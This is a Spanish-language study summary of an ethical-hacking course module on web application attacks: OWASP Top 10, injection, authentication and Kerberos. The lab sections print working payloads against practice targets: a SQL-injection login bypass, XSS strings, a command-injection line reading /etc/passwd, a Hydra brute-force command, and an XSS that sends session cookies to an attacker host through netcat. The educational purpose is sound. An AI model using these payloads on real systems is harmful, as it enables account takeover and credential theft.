# 🛡️ Repaso de Hacker Ético - Cisco Tema 6

Este documento contiene el resumen detallado y los recursos visuales (mapas mentales) generados durante la sesión de repaso del **Tema 6: Explotación de Vulnerabilidades Basadas en Aplicaciones**.

---

## 🗺️ Mapa Mental General del Módulo
![Mapa Mental Módulo 6](./assets/img/mindmap_ethical_hacker_ch6.png)

---

## 📋 6.1: Descripción General y OWASP Top 10

El **OWASP Top 10** es el estándar global sobre los riesgos de seguridad más críticos en aplicaciones web. Es fundamental para priorizar esfuerzos de defensa y hacking ético.

### 🗺️ Mapa Mental: OWASP Top 10
![OWASP Top 10](./assets/img/mindmap_owasp_top10_espanol.png)

### Puntos Clave:
1.  **A01: Control de Acceso Roto:** Acceso a datos fuera de permisos.
2.  **A02: Fallos Criptográficos:** Exposición de datos sensibles por cifrado débil.
3.  **A03: Inyección:** Datos no confiables enviados a un intérprete (SQL, comandos).
4.  **A04: Diseño Inseguro:** Fallos en la arquitectura del software.
5.  **A05: Configuración Incorrecta:** Ajustes de seguridad por defecto o incompletos.
6.  **A06: Componentes Vulnerables/Obsoletos:** Librerías o frameworks sin parches.
7.  **A07: Fallos de Identificación/Autenticación:** Debilidades en el login y sesiones.
8.  **A08: Fallos en Integridad de Software/Datos:** No verificar firmas o integridad.
9.  **A09: Fallos de Registro/Supervisión:** Falta de logs y monitorización de ataques.
10. **A10: SSRF:** El servidor realiza peticiones no autorizadas a la red interna.

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop)
En nuestras sesiones prácticas, utilizamos **OWASP Juice Shop** para identificar estas vulnerabilidades (ver detalle en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md)):
*   **VULN-05 (Security Misconfiguration):** Acceso al Scoreboard oculto mediante navegación directa (`/#/score-board`).
*   **VULN-06 (Improper Error Handling):** Generación de *Stack Traces* al solicitar archivos inexistentes en `/ftp`, revelando que el servidor usa `Express ^4.21.0`.

---

## 🧠 6.3: Fallas de la Lógica Empresarial (CWE-840)

Estas vulnerabilidades ocurren cuando los flujos legítimos de la aplicación se usan para fines maliciosos debido a un diseño defectuoso.

### 🗺️ Mapa Mental: Lógica Empresarial
![Lógica de Negocio](./assets/img/mindmap_logica_negocio_espanol.png)

### Resumen Técnico:
- **Naturaleza:** No son errores de codificación sintáctica, sino de diseño de procesos.
- **Detección:** Los escáneres automáticos no suelen detectarlos. Requiere **pruebas manuales**.
- **Ejemplos Críticos:**
    - **Propiedad no verificada:** Cambiar IDs en parámetros para acceder a datos ajenos.
    - **Salto de Flujo:** Ir directamente a la página de éxito sin realizar la acción requerida.
    - **Falta de Límites:** Permitir acciones infinitas (fuerza bruta, agotamiento de stock).
- **Defensa:** Implementar **Modelado de Amenazas** y validar la autorización en cada paso del flujo.

---

## 💉 6.4: Vulnerabilidades Basadas en Inyección

Ocurren cuando se envían datos no confiables a un intérprete. Es uno de los vectores de ataque más antiguos y peligrosos.

### 🗺️ Mapa Mental: Inyecciones
![Inyección](./assets/img/mindmap_inyeccion_espanol.png)

### Resumen Técnico:

#### 1. Inyección SQL (SQLi)
El atacante interfiere con las consultas que una aplicación hace a su base de datos.
- **Categorías:**
    - **In-band (En banda):** El atacante usa el mismo canal para el ataque y los resultados (ej: `UNION`, errores visibles).
    - **Blind (Ciega):** No hay salida de datos directa. Se infiere información mediante respuestas booleanas o tiempos de espera (`Time-based`).
    - **Out-of-band (Fuera de banda):** Se extraen datos a través de otros protocolos (DNS, HTTP) si el servidor puede hacer peticiones externas.

#### 2. Inyección de Comandos (OS Command Injection)
Ejecución de comandos del sistema operativo a través de la aplicación vulnerable.
- **Ejemplo:** `ping 127.0.0.1 ; cat /etc/passwd`
- **Diferencia clave:** No es lo mismo que inyección de código (que afecta al lenguaje de programación como PHP o Python).

#### 3. Inyección LDAP
Ataques dirigidos a servicios de directorio (Active Directory) para saltar la autenticación o extraer datos de usuarios/grupos.

### 🛡️ Defensas Críticas:
- **Consultas Preparadas (Prepared Statements):** Es la defensa #1 contra SQLi.
- **Validación de Entradas:** Solo permitir caracteres esperados (Allow-list).
- **Saneamiento:** Escapar caracteres especiales antes de procesarlos.

### 🛠️ Ejemplo Práctico de Laboratorio (Juice Shop & WebGoat)
*   **SQLi (Bypass de Login):** (Ver detalle en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md))
    *   **Payload:** `' or 1=1--`
    *   **Resultado:** Acceso como administrador sin conocer la contraseña.
*   **XSS Reflejado vs DOM-based:** (Ver detalle en [Laboratorio-Pentesting-02.md](./labs/Laboratorio-Pentesting-02.md))
    *   **Reflejado:** `<img src=x onerror=alert('XSS')>` (Bypass de filtros).
    *   **DOM (Juice Shop):** `/#/search?q=<iframe src="javascript:alert('xss')">` (El payload se procesa en el cliente, no llega al servidor).

---

## 🔐 6.5: Explotando Vulnerabilidades de Autenticación

Los atacantes buscan eludir los mecanismos de control de acceso para suplantar identidades legítimas.

### 🗺️ Mapa Mental: Autenticación
![Autenticación](./assets/img/mindmap_autenticacion_espanol.png)

### 📋 Descripción General (6.5.1)
Los vectores principales incluyen:
*   **Fuerza Bruta:** Intentos automatizados de adivinar credenciales.
*   **Secuestro de Sesiones:** Robo de tokens activos.
*   **Redireccionamiento Inseguro:** Manipulación de URLs para phishing o malware.
*   **Credenciales por Defecto:** Uso de passwords de fábrica en infraestructura.
*   **Vulnerabilidades de Kerberos:** Ataques avanzados en entornos Windows/AD.

---

### 🍪 6.5.2: Secuestro de Sesión (Session Hijacking)
*   **Concepto:** Una vez que un usuario se autentica, el **ID de Sesión (Cookie/Token)** se convierte en su "llave" de acceso. Si el atacante la roba, no necesita la contraseña.
*   **Etapas de la Sesión:** Preautenticación -> Autenticación -> Gestión de Sesión -> Control de Acceso -> Finalización.
*   **Riesgo:** Si las cookies no tienen atributos de seguridad (`HttpOnly`, `Secure`), son vulnerables a ataques como XSS.

---

### ↪️ 6.5.4: Ataques de Redireccionamiento
*   **Vulnerabilidad:** "Unvalidated Redirects and Forwards".
*   **Mecánica:** La aplicación redirige a una URL proporcionada por un parámetro sin validar (ej: `?url=http://malicioso.com`).
*   **Uso:** Phishing y bypass de controles de seguridad basados en dominios de confianza.

---

### 🛠️ 6.5.5: Credenciales Predeterminadas
*   **El eslabón débil:** Routers, switches y cámaras suelen mantener `admin/admin` o similares.
*   **Fuentes de información:**
    *   `defaultpassword.com`: Repositorio de credenciales de fábrica.
    *   **Shodan/Censys:** Motores de búsqueda para localizar estos dispositivos expuestos en Internet.

---

### 🎫 6.5.6: Vulnerabilidades de Kerberos
Ataques críticos en infraestructuras de dominio:
1.  **Golden Ticket:** Acceso total y persistente tras comprometer el hash de la cuenta `KRBTGT`.
2.  **Delegación no restringida:** Permite que un servidor comprometido use las credenciales de un usuario para autenticarse ante otros servicios en su nombre.

---

### 🔨 6.5.8: Gestión y Herramientas de Contraseñas
Las contraseñas no se guardan en texto plano, sino como **hashes**.
*   **Tipos de Ataque:**
    *   **Diccionario:** Probar palabras comunes.
    *   **Fuerza Bruta:** Probar todas las combinaciones posibles.
    *   **Tablas Arcoíris (Rainbow Tables):** Hashes precalculados para acelerar el cracking (utilizado por herramientas como **RainbowCrack**).
*   **Herramientas Estrella:**
    *   **hashcat:** Líder en cracking basado en GPU.
    *   **John the Ripper:** Versatilidad y soporte para múltiples formatos.

### 🛠️ Ejemplo Práctico de Laboratorio (DVWA & Juice Shop)
*   **Fuerza Bruta (Hydra):** (Ver guion completo en [Guion-Demo-BruteForce.md](./labs/Guion-Demo-BruteForce.md))
    Ataque contra DVWA (Nivel Medio) tras comprobar que la sanitización impide SQLi:
    ```bash
    hydra -l admin -P /tmp/pass.txt -s 80 dvwa-target http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=medium; PHPSESSID=[COOKIE]:F=incorrect"
    ```
*   **Session Hijacking (Robo de Cookies):** (Ver paso a paso en [Laboratorio-Pentesting-01.md](./labs/Laboratorio-Pentesting-01.md#421-robo-de-cookies-session-hijacking))
    1.  **Atacante:** Escucha con netcat: `nc -l -p 8888`
    2.  **Víctima (ejecuta XSS):** `<img src=x onerror="document.location='http://[IP_KALI]:8888/?cookie=' + document.cookie">`
    3.  **Resultado:** El atacante recibe la cookie de sesión en su terminal y puede suplantar al usuario.

---

## 🕒 Siguiente Tema: 6.6 Explotando Vulnerabilidades de Autorización
*(Pendiente de desarrollar...)*

